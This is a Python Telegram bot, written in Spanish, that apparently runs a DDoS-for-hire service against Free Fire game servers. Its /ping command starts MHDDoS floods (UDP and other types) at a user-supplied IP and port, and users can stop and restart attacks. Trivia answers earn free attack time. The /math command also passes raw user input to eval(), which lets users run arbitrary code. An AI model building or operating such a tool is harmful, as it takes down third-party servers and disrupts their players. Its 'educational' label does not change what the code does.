import telebot
import json
import os
import time
import random
import operator
import threading
import subprocess
from threading import Lock, Thread, Timer
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = "TU_BOT_TOKEN"
ADMIN_ID = TU_ADMIN_ID
GROUP_LINK = "LINK_DE_TU_GRUPO"
START_PY_PATH = "/workspaces/MHDDoS/start.py"
ALLOWED_PORTS = [10010, 10011, 10012, 10013, 10014, 10015, 10016, 10017, 10018, 10019]

bot = telebot.TeleBot(BOT_TOKEN)
db_lock = Lock()
cooldowns = {}
active_attacks = {}
spam_cooldowns = {}

groups_file = "groups.json"
users_file = "users.json"
free_time_file = "free_time.json"

if not os.path.exists(groups_file):
    with open(groups_file, "w") as f:
        json.dump({"groups": []}, f)

if not os.path.exists(users_file):
    with open(users_file, "w") as f:
        json.dump({"users": []}, f)

if not os.path.exists(free_time_file):
    with open(free_time_file, "w") as f:
        json.dump({}, f)

def load_json(file_path):
    with open(file_path, "r") as f:
        return json.load(f)

def save_json(file_path, data):
    with open(file_path, "w") as f:
        json.dump(data, f)

def load_groups():
    return load_json(groups_file)["groups"]

def save_groups(groups):
    save_json(groups_file, {"groups": groups})

def load_users():
    return load_json(users_file)["users"]

def save_users(users):
    save_json(users_file, {"users": users})

def load_free_time():
    return load_json(free_time_file)

def save_free_time(data):
    save_json(free_time_file, data)

def add_user(user_id):
    users = load_users()
    if user_id not in users:
        users.append(user_id)
        save_users(users)

def is_allowed(message):
    groups = load_groups()
    user_id = message.from_user.id

    if message.text.startswith("/register"):
        return True

    users = load_users()
    if user_id not in users:
        bot.reply_to(message, "❌ *Debes registrarte antes de usar este bot.*\nUsa el comando /register para registrarte.", parse_mode="Markdown")
        return False

    if message.chat.id in groups or (message.chat.type == "private" and user_id == ADMIN_ID):
        return True

    bot.reply_to(message, f"❌ *¡Este bot solo funciona en los grupos autorizados!*\n🔗 Únete a nuestro grupo de *Free Fire* aquí: {GROUP_LINK}")
    return False

def is_admin(message):
    return message.from_user.id == ADMIN_ID or message.from_user.id in [admin.user.id for admin in bot.get_chat_administrators(message.chat.id)]

def generate_math_question(level):
    ops = {
        'easy': [(operator.add, '+'), (operator.sub, '-')],
        'normal': [(operator.add, '+'), (operator.sub, '-'), (operator.mul, '*')],
        'hard': [(operator.add, '+'), (operator.sub, '-'), (operator.mul, '*'), (operator.truediv, '/')]
    }

    op, symbol = random.choice(ops[level])

    if level == 'easy':
        num1, num2 = random.randint(1, 10), random.randint(1, 10)
    elif level == 'normal':
        num1, num2 = random.randint(1, 50), random.randint(1, 50)
    else:  # hard
        num1, num2 = random.randint(1, 100), random.randint(1, 100)

    if symbol == '/':
        num2 = random.choice([i for i in range(1, 101) if num1 % i == 0])

    question = f"¿Cuánto es {num1} {symbol} {num2}?"
    answer = str(op(num1, num2))

    return question, answer

def timeout_handler(message, answer, user_id, level):
    time.sleep(20)
    bot.send_message(message.chat.id, "❌ *Tiempo agotado. ¡Inténtalo de nuevo!*", parse_mode="Markdown")

@bot.message_handler(commands=["trivia"])
def handle_trivia(message):
    try:
        level = message.text.split()[1].lower()
        if level not in ['easy', 'normal', 'hard']:
            raise ValueError("Nivel no válido")

        question, answer = generate_math_question(level)
        user_id = message.from_user.id

        bot.send_message(message.chat.id, f"🎮 *Pregunta de {level}:* {question}")

        timer = threading.Thread(target=timeout_handler, args=(message, answer, user_id, level))
        timer.start()

        bot.register_next_step_handler(message, check_answer, answer, user_id, level, timer)

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ *Error al iniciar la trivia: {str(e)}*", parse_mode="Markdown")

def check_answer(message, correct_answer, user_id, level, timer):
    if timer.is_alive():
        timer.join()

    if message.text.strip() == correct_answer:
        bot.send_message(message.chat.id, "✅ *¡Respuesta correcta!*")

        if level == "easy":
            free_duration = 1
        elif level == "normal":
            free_duration = 3 
        elif level == "hard":
            free_duration = 24

        free_time = load_free_time()
        free_time[user_id] = time.time() + free_duration * 3600
        save_free_time(free_time)
        bot.send_message(message.chat.id, f"🎉 *¡Felicidades! Has ganado {free_duration} hora(s) de uso gratis del bot.*", parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, "❌ *Respuesta incorrecta. ¡Inténtalo de nuevo!*", parse_mode="Markdown")

@bot.message_handler(commands=["freetime"])
def handle_freetime(message):
    user_id = message.from_user.id
    free_time = load_free_time()
    if user_id in free_time:
        remaining_time = free_time[user_id] - time.time()
        if remaining_time > 0:
            hours, remainder = divmod(remaining_time, 3600)
            minutes = remainder // 60
            bot.send_message(message.chat.id, f"🕒 *Tiempo gratis restante:* {int(hours)} horas y {int(minutes)} minutos.", parse_mode="Markdown")
        else:
            del free_time[user_id]
            save_free_time(free_time)
            bot.send_message(message.chat.id, "🕒 *Tu tiempo gratis ha expirado.*", parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, "🕒 *No tienes tiempo gratis disponible.*", parse_mode="Markdown")

@bot.message_handler(commands=["register"])
def handle_register(message):
    user_id = message.from_user.id
    add_user(user_id)
    bot.reply_to(message, f"✅ *¡Registrado correctamente!*\nTu ID de usuario es: `{user_id}`", parse_mode="Markdown")

@bot.message_handler(commands=["id"])
def handle_id(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if message.chat.type == "private":
        bot.reply_to(message, f"✅ *Tu ID de usuario es:* `{user_id}`", parse_mode="Markdown")
    else:
        bot.reply_to(message, f"✅ *Tu ID de usuario es:* `{user_id}`\n*El ID del grupo es:* `{chat_id}`", parse_mode="Markdown")

@bot.message_handler(commands=["kick"])
def handle_kick(message):
    if not is_admin(message):
        bot.reply_to(message, "❌ *Solo los administradores pueden usar este comando.*", parse_mode="Markdown")
        return

    try:
        user_id = int(message.text.split()[1])
        bot.kick_chat_member(message.chat.id, user_id)
        bot.reply_to(message, f"✅ *Usuario {user_id} expulsado del grupo.*", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ *Error al expulsar al usuario: {str(e)}*", parse_mode="Markdown")

@bot.message_handler(commands=["ban"])
def handle_ban(message):
    if not is_admin(message):
        bot.reply_to(message, "❌ *Solo los administradores pueden usar este comando.*", parse_mode="Markdown")
        return

    try:
        user_id = int(message.text.split()[1])
        bot.ban_chat_member(message.chat.id, user_id)
        bot.reply_to(message, f"✅ *Usuario {user_id} baneado del grupo.*", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ *Error al banear al usuario: {str(e)}*", parse_mode="Markdown")

@bot.message_handler(commands=["mute"])
def handle_mute(message):
    if not is_admin(message):
        bot.reply_to(message, "❌ *Solo los administradores pueden usar este comando.*", parse_mode="Markdown")
        return

    try:
        args = message.text.split()
        user_id = int(args[1])
        mute_time = int(args[2])
        bot.restrict_chat_member(message.chat.id, user_id, until_date=time.time() + mute_time * 60)
        bot.reply_to(message, f"✅ *Usuario {user_id} silenciado por {mute_time} minutos.*", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ *Error al silenciar al usuario: {str(e)}*", parse_mode="Markdown")

@bot.message_handler(commands=["math"])
def handle_math(message):
    try:
        expression = message.text.replace("/math ", "")
        result = eval(expression)
        bot.reply_to(message, f"✅ *Resultado:* `{result}`", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ *Error al evaluar la expresión: {str(e)}*", parse_mode="Markdown")

@bot.message_handler(commands=["ping"])
def handle_ping(message):
    if not is_allowed(message):
        return

    telegram_id = message.from_user.id

    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 20:
        bot.reply_to(message, "❌ *Espera 20 segundos* antes de intentar de nuevo.")
        return

    args = message.text.split()
    if len(args) != 5 or ":" not in args[2]:
        bot.reply_to(
            message,
            (
                "❌ *Formato inválido!* 🚫\n\n"
                "📌 *Uso correcto:*\n"
                "`/ping <TIPO> <IP/HOST:PUERTO> <HILOS> <MS>`\n\n"
                "💡 *Ejemplo de uso:*\n"
                "`/ping UDP 143.92.125.230:10013 1 480`"
            ),
            parse_mode="Markdown",
        )
        return

    attack_type = args[1]
    ip_port = args[2]
    threads = int(args[3])
    duration = int(args[4])

    try:
        ip, port = ip_port.split(":")
        port = int(port)
        if port not in ALLOWED_PORTS:
            bot.reply_to(message, f"❌ *Puerto no permitido.* Solo se permiten los puertos: {ALLOWED_PORTS}")
            return
    except ValueError:
        bot.reply_to(message, "❌ *Formato de IP:Puerto inválido.*")
        return

    if threads > 3:
        bot.reply_to(message, "❌ *El número máximo de hilos permitido es 3.*")
        return

    if duration > 600:
        bot.reply_to(message, "❌ *La duración máxima permitida es de 600 segundos (10 minutos).*")
        return

    command = ["python", START_PY_PATH, attack_type, ip_port, str(threads), str(duration)]

    try:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        active_attacks[telegram_id] = process
        cooldowns[telegram_id] = time.time()
        cooldowns[f"last_command_{telegram_id}"] = message.text

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⛔ *Parar Ataque* ⛔", callback_data=f"stop_{telegram_id}"))

        bot.reply_to(
            message,
            (
                "*🔥 ¡Ataque Iniciado! 🔥*\n\n"
                f"📍 *IP:* {ip_port}\n"
                f"⚙️ *Tipo:* {attack_type}\n"
                f"🧵 *Hilos:* {threads}\n"
                f"⏳ *Duración:* {duration} segundos\n\n"
                "*Este bot fue creado por @xFernandoh* 🎮"
            ),
            reply_markup=markup,
            parse_mode="Markdown",
        )
    except Exception as e:
        bot.reply_to(message, f"❌ *Error al iniciar el ataque:* {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_attack(call):
    telegram_id = int(call.data.split("_")[1])

    if call.from_user.id != telegram_id:
        try:
            bot.answer_callback_query(
                call.id, "❌ *Solo el usuario que inició el ataque puede pararlo.*"
            )
        except Exception as e:
            print(f"Error al responder a la consulta de callback: {str(e)}")
        return

    if telegram_id in active_attacks:
        process = active_attacks[telegram_id]
        process.terminate()
        del active_attacks[telegram_id]

        try:
            bot.answer_callback_query(call.id, "✅ *Ataque detenido con éxito.*")
            
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔄 Realizar ataque nuevamente", callback_data=f"restart_attack_{telegram_id}"))

            bot.edit_message_text(
                "*[⛔] *ATAQUE PARADO* [⛔]*\n\n"
                "¿Quieres realizar el ataque nuevamente? Tienes **20 segundos** para decidir.",
                chat_id=call.message.chat.id,
                message_id=call.message.id,
                reply_markup=markup,
                parse_mode="Markdown",
            )

            Timer(20, delete_message, args=(call.message.chat.id, call.message.message_id)).start()
        except Exception as e:
            print(f"Error al responder a la consulta de callback o editar el mensaje: {str(e)}")
    else:
        try:
            bot.answer_callback_query(call.id, "❌ *No hay ataque activo para detener.*")
        except Exception as e:
            print(f"Error al responder a la consulta de callback: {str(e)}")

def delete_message(chat_id, message_id):
    try:
        bot.delete_message(chat_id, message_id)
    except Exception as e:
        print(f"Error al eliminar el mensaje: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("restart_attack_"))
def handle_restart_attack(call):
    telegram_id = int(call.data.split("_")[2])

    if call.from_user.id != telegram_id:
        try:
            bot.answer_callback_query(
                call.id, "❌ *Solo el usuario que inició el ataque puede repetirlo.*"
            )
        except Exception as e:
            print(f"Error al responder a la consulta de callback: {str(e)}")
        return

    if telegram_id in spam_cooldowns and time.time() - spam_cooldowns[telegram_id] < 60:
        bot.answer_callback_query(
            call.id, "❌ *Has hecho demasiadas solicitudes. Espera 1 minuto antes de intentar de nuevo.*"
        )
        return

    last_command = cooldowns.get(f"last_command_{telegram_id}")
    if not last_command:
        try:
            bot.answer_callback_query(call.id, "❌ *No hay un ataque previo para repetir.*")
        except Exception as e:
            print(f"Error al responder a la consulta de callback: {str(e)}")
        return

    try:
        args = last_command.split()
        attack_type = args[1]
        ip_port = args[2]
        threads = int(args[3])
        duration = int(args[4])

        if threads > 3:
            bot.answer_callback_query(call.id, "❌ *El número máximo de hilos permitido es 3.*")
            return

        if duration > 600:
            bot.answer_callback_query(call.id, "❌ *La duración máxima permitida es de 600 segundos (10 minutos).*")
            return

        command = ["python", START_PY_PATH, attack_type, ip_port, str(threads), str(duration)]

        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        active_attacks[telegram_id] = process
        cooldowns[telegram_id] = time.time()

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⛔ *Parar Ataque* ⛔", callback_data=f"stop_{telegram_id}"))

        bot.edit_message_text(
            "*🔥 ¡Ataque Reiniciado! 🔥*\n\n"
            f"📍 *IP:* {ip_port}\n"
            f"⚙️ *Tipo:* {attack_type}\n"
            f"🧵 *Hilos:* {threads}\n"
            f"⏳ *Duración:* {duration} segundos\n\n"
            "*Este bot fue creado por @xFernandoh* 🎮",
            chat_id=call.message.chat.id,
            message_id=call.message.id,
            reply_markup=markup,
            parse_mode="Markdown",
        )
        bot.answer_callback_query(call.id, "✅ *Ataque reiniciado con éxito.*")
    except Exception as e:
        bot.answer_callback_query(call.id, f"❌ *Error al reiniciar el ataque:* {str(e)}")

    if telegram_id in spam_cooldowns:
        spam_cooldowns[telegram_id] = time.time()
    else:
        spam_cooldowns[telegram_id] = time.time()

@bot.message_handler(commands=["addgroup"])
def handle_addgroup(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ *Solo el admin puede agregar grupos.*")
        return

    try:
        group_id = int(message.text.split()[1])
        groups = load_groups()

        if group_id in groups:
            bot.reply_to(message, "❌ *Este grupo ya está en la lista.*")
            return

        groups.append(group_id)
        save_groups(groups)

        bot.reply_to(message, f"✅ *Grupo {group_id} agregado correctamente.*")
    except IndexError:
        bot.reply_to(message, "❌ *Por favor, proporciona un ID de grupo válido.*")
    except ValueError:
        bot.reply_to(message, "❌ *El ID de grupo debe ser un número válido.*")

@bot.message_handler(commands=["removegroup"])
def handle_removegroup(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ *Solo el admin puede eliminar el bot de los grupos.*")
        return

    if message.chat.type != "private":
        bot.reply_to(message, "❌ *Este comando solo puede usarse en privado.*")
        return

    try:
        group_id = int(message.text.split()[1])
        groups = load_groups()

        if group_id not in groups:
            bot.reply_to(message, "❌ *Este grupo no está en la lista.*")
            return

        groups.remove(group_id)
        save_groups(groups)

        bot.leave_chat(group_id)

        bot.reply_to(message, f"✅ *Bot eliminado correctamente del grupo {group_id}.*")
    except IndexError:
        bot.reply_to(message, "❌ *Por favor, proporciona un ID de grupo válido.*")
    except ValueError:
        bot.reply_to(message, "❌ *El ID de grupo debe ser un número válido.*")

@bot.message_handler(commands=["listgroups"])
def handle_listgroups(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ *Solo el admin puede ver la lista de grupos.*")
        return

    groups = load_groups()
    if not groups:
        bot.reply_to(message, "❌ *No hay grupos autorizados.*")
        return

    groups_list = "\n".join([f"📍 *Grupo ID:* {group_id}" for group_id in groups])
    bot.reply_to(
        message,
        f"📋 *Grupos autorizados:*\n{groups_list}",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=["help"])
def handle_help(message):
    if not is_allowed(message):
        return

    bot.send_message(
        message.chat.id,
        (
            "🔧 *¿Cómo usar este bot?* 🤖\n\n"
            "Este bot está diseñado para ayudarte a ejecutar ataques de prueba con fines educativos en Free Fire.\n\n"
            "*Comandos disponibles:*\n"
            "1. `/start`: Inicia el bot y te da una breve introducción.\n"
            "2. `/ping <TIPO> <IP/HOST:PUERTO> <HILOS> <MS>`: Inicia un ataque de ping.\n"
            "3. `/addgroup <ID del grupo>`: Agrega un grupo a la lista de grupos permitidos (solo admin).\n"
            "4. `/removegroup <ID del grupo>`: Elimina un grupo de la lista de grupos permitidos (solo admin).\n"
            "5. `/help`: Muestra esta ayuda.\n"
            "6. `/timeactive`: Muestra el tiempo activo del bot y el tiempo restante antes de que se cierre.\n"
            "7. `/broadcast <mensaje>`: Envía un mensaje a todos los usuarios registrados (solo admin).\n"
            "8. `/broadcastgroup <mensaje>`: Envía un mensaje a todos los grupos autorizados (solo admin).\n"
            "9. `/trivia <nivel>`: Inicia un juego de trivia con preguntas de matemáticas.\n"
            "10. `/math <expresión>`: Evalúa una expresión matemática.\n"
            "11. `/kick <usuario>`: Expulsa a un usuario del grupo (solo admin).\n"
            "12. `/ban <usuario>`: Prohíbe a un usuario en el grupo (solo admin).\n"
            "13. `/mute <usuario> <tiempo>`: Silencia a un usuario por un período de tiempo (solo admin).\n"
            "14. `/freetime`: Muestra el tiempo gratis restante.\n\n"
            "¡Juega con responsabilidad y diviértete! 🎮"
        ),
        parse_mode="Markdown",
    )

@bot.message_handler(commands=["timeactive"])
def handle_timeactive(message):
    if not is_allowed(message):
        return

    elapsed_time = time.time() - start_time
    remaining_time = max(0, 140 * 60 - elapsed_time)

    elapsed_minutes = int(elapsed_time // 60)
    elapsed_seconds = int(elapsed_time % 60)

    remaining_minutes = int(remaining_time // 60)
    remaining_seconds = int(remaining_time % 60)

    bot.reply_to(
        message,
        (
            f"🕒 *Tiempo activo del bot:*\n"
            f"✅ *Tiempo transcurrido:* {elapsed_minutes}m {elapsed_seconds}s\n"
            f"⚠️ *Tiempo restante:* {remaining_minutes}m {remaining_seconds}s\n\n"
            "🚀 *Recuerda que el bot se cierra automáticamente después de 140 minutos.*"
        ),
        parse_mode="Markdown"
    )

@bot.message_handler(commands=["broadcast"])
def handle_broadcast(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ *Solo el admin puede usar este comando.*")
        return

    text = message.text.replace("/broadcast", "").strip()
    if not text:
        bot.reply_to(message, "❌ *Debes escribir un mensaje después de /broadcast.*")
        return

    users = load_users()
    success_count, fail_count = 0, 0

    for user_id in users:
        try:
            bot.send_message(user_id, f"📢 {text}", parse_mode="Markdown")
            success_count += 1
        except Exception as e:
            fail_count += 1
            print(f"No se pudo enviar mensaje a {user_id}: {str(e)}")

    bot.reply_to(message, f"✅ Mensaje enviado a {success_count} usuarios. ❌ Falló en {fail_count}.")

@bot.message_handler(commands=["broadcastgroup"])
def handle_broadcastgroup(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ *Solo el admin puede usar este comando.*")
        return

    text = message.text.replace("/broadcastgroup", "").strip()
    if not text:
        bot.reply_to(message, "❌ *Debes escribir un mensaje después de /broadcastgroup.*")
        return

    groups = load_groups()
    success_count, fail_count = 0, 0

    for group_id in groups:
        try:
            bot.send_message(group_id, f"📢 {text}", parse_mode="Markdown")
            success_count += 1
        except Exception as e:
            fail_count += 1
            print(f"No se pudo enviar mensaje al grupo {group_id}: {str(e)}")

    bot.reply_to(message, f"✅ Mensaje enviado a {success_count} grupos. ❌ Falló en {fail_count}.")

def notify_groups_bot_started():
    groups = load_groups()
    for group_id in groups:
        try:
            bot.send_message(
                group_id,
                "✅ *¡El bot ha sido reactivado!*\n\n"
                "Ya puedes seguir utilizando los comandos disponibles.\n\n"
                "¡Gracias por su paciencia! 💪",
                parse_mode="Markdown",
            )
        except Exception as e:
            print(f"No se pudo enviar mensaje al grupo {group_id}: {str(e)}")

def check_shutdown_time():
    start_time = time.time()
    while True:
        elapsed_time = time.time() - start_time
        remaining_time = max(0, 140 * 60 - elapsed_time)

        if remaining_time <= 300:
            groups = load_groups()
            for group_id in groups:
                try:
                    bot.send_message(
                        group_id,
                        "⚠️ *Aviso Importante:*\n\n"
                        "El bot se apagará en **5 minutos** debido a límites de tiempo.\n"
                        "Un administrador lo reactivará pronto. Por favor, sean pacientes.\n\n"
                        "¡Gracias por su comprensión! 🙏",
                        parse_mode="Markdown",
                    )
                except Exception as e:
                    print(f"No se pudo enviar mensaje al grupo {group_id}: {str(e)}")

            time.sleep(300)
            break

        time.sleep(60)

if __name__ == "__main__":
    notify_groups_bot_started()

    shutdown_thread = threading.Thread(target=check_shutdown_time)
    shutdown_thread.daemon = True
    shutdown_thread.start()

    bot.infinity_polling()